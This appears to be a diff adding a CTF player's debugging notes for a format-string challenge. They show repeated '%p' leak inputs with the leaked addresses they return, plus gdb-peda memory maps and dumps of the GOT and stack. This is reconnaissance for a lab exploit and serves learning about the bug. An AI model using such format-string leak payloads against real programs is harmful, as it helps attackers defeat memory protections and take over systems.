@@ -1,0 +1,82 @@
+Nice, now give me your second input:
+AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%
+AAAAAAAA,0x4062a1,(nil),0x4062f9,0x7fffffffdf50,(nil),0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x7fffffff000a,0x401070,(nil),(nil),0x401162,0x7fffffffdfe0,0x401765,0x401780,0x7ffff7e2dd0a,0x7fffffffe0d8,%
+
+Alright, one last input:
+AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p  
+AAAAAAAA,0x4062a1,(nil),0x4062f7,0x7fffffffdf50,(nil),0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0xa70252c70252c,0x7fffffff000a,0x401070,(nil),(nil),0x401162,0x7fffffffdfe0,0x401765,0x401780,0x7ffff7e2dd0a,0x7fffffffe0d8
+
+---------------------------------------------------------------------------------------
+
+FAREWELL:
+
+Hopefully something worked right!
+
+Adios!
+
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x003fe000         0x00400000         rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/fmtstr
+0x00400000         0x00401000         r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/fmtstr
+0x00401000         0x00402000         r-xp	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/fmtstr
+0x00402000         0x00404000         r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/fmtstr
+0x00404000         0x00405000         r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/fmtstr
+0x00405000         0x00406000         rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/fmtstr
+0x00406000         0x00427000         rw-p	[heap]
+0x00007ffff7e05000 0x00007ffff7e07000 rw-p	mapped
+0x00007ffff7e07000 0x00007ffff7e2c000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/libc-2.31.so
+0x00007ffff7e2c000 0x00007ffff7f77000 r-xp	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/libc-2.31.so
+0x00007ffff7f77000 0x00007ffff7fc1000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/libc-2.31.so
+0x00007ffff7fc1000 0x00007ffff7fc2000 ---p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/libc-2.31.so
+0x00007ffff7fc2000 0x00007ffff7fc5000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/libc-2.31.so
+0x00007ffff7fc5000 0x00007ffff7fc8000 rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/libc-2.31.so
+0x00007ffff7fc8000 0x00007ffff7fce000 rw-p	mapped
+0x00007ffff7fce000 0x00007ffff7fd1000 r--p	[vvar]
+0x00007ffff7fd1000 0x00007ffff7fd2000 r-xp	[vdso]
+0x00007ffff7fd2000 0x00007ffff7fd3000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/ld-2.31.so
+0x00007ffff7fd3000 0x00007ffff7ff3000 r-xp	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/ld-2.31.so
+0x00007ffff7ff3000 0x00007ffff7ffb000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/ld-2.31.so
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/ld-2.31.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/ld-2.31.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
+
+gdb-peda$ x/80gx 0x00405000
+0x405000:	0x0000000000404e20	0x00007ffff7ffe180
+0x405010:	0x00007ffff7fe8610	0x00007ffff7e7d5f0
+0x405020 <setbuf@got.plt>:	0x00007ffff7e84550	0x00007ffff7e5dcf0
+0x405030 <fgets@got.plt>:	0x00007ffff7e7b9c0	0x0000000000000000
+0x405040:	0x0000000000000000	0x0000000000000000
+0x405050:	0x0000000000000000	0x0000000000000000
+0x405060 <stdout@GLIBC_2.2.5>:	0x00007ffff7fc66a0	0x0000000000000000
+0x405070 <stdin@GLIBC_2.2.5>:	0x00007ffff7fc5980	0x0000000000000000
+0x405080 <stderr@GLIBC_2.2.5>:	0x00007ffff7fc65c0	0x0000000000000000
+0x405090:	0x0000000000000000	0x0000000000000000
+0x4050a0:	0x0000000000000000	0x0000000000000000
+
+
+gdb-peda$ x/80gx 0x7fffffffdf00
+0x7fffffffdf00:	0x0000000000000000	0x0000000000000000
+0x7fffffffdf10:	0x0000000000000000	0x00007ffff7e7ba56
+0x7fffffffdf20:	0x0000000000000000	0x0000000000000000
+0x7fffffffdf30:	0x00007fffffffdfd0	0x0000000000401070
+0x7fffffffdf40:	0x0000000000000000	0x0000000000401626
+0x7fffffffdf50:	0x4141414141414141	0x4141414141414141
+0x7fffffffdf60:	0x0000000000000a61	0x00007ffff7e88709
+0x7fffffffdf70:	0x000000000000000a	0x00007ffff7e88b63
+0x7fffffffdf80:	0x0000000000000058	0x00007ffff7fc66a0
+0x7fffffffdf90:	0x0000000000402008	0x00007ffff7e7d76a
+0x7fffffffdfa0:	0x0000000000000000	0x00007fffffffdfd0
+0x7fffffffdfb0:	0x0000000000401070	0x0000000000000000
+0x7fffffffdfc0:	0x0000000000000000	0x0000000000401162
+0x7fffffffdfd0:	0x00007fffffffdfe0	0x0000000000401765
+0x7fffffffdfe0:	0x0000000000401780	0x00007ffff7e2dd0a
+0x7fffffffdff0:	0x00007fffffffe0d8	0x0000000100000000
+0x7fffffffe000:	0x00000000004016f3	0x00007ffff7e2d7cf
+0x7fffffffe010:	0x0000000000000000	0x604e35e0c682f4ca
+0x7fffffffe020:	0x0000000000401070	0x0000000000000000
+0x7fffffffe030:	0x0000000000000000	0x0000000000000000
+0x7fffffffe040:	0x9fb1ca9f5662f4ca	0x9fb1daa55004f4ca
+0x7fffffffe050:	0x0000000000000000	0x0000000000000000
+0x7fffffffe060:	0x0000000000000000	0x0000000000000001
